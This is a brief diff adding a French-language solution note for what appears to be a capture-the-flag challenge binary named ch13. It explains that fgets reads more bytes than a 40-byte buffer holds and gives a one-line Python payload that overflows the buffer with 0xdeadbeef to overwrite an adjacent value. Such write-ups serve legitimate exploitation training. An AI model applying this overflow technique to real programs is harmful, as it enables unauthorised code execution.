@@ -1,0 +1,3 @@
+taille du buffer(40) et l'utilisateur peut fournir 45 caractere avec fgets (-1 avec le /0)
+(python -c 'print "a" * 40 + "\xef\xbe\xad\xde"' ; cat) | ./ch13
+	boucle sur la stack sur 5b puis rajoutes le 0xdeadbeef
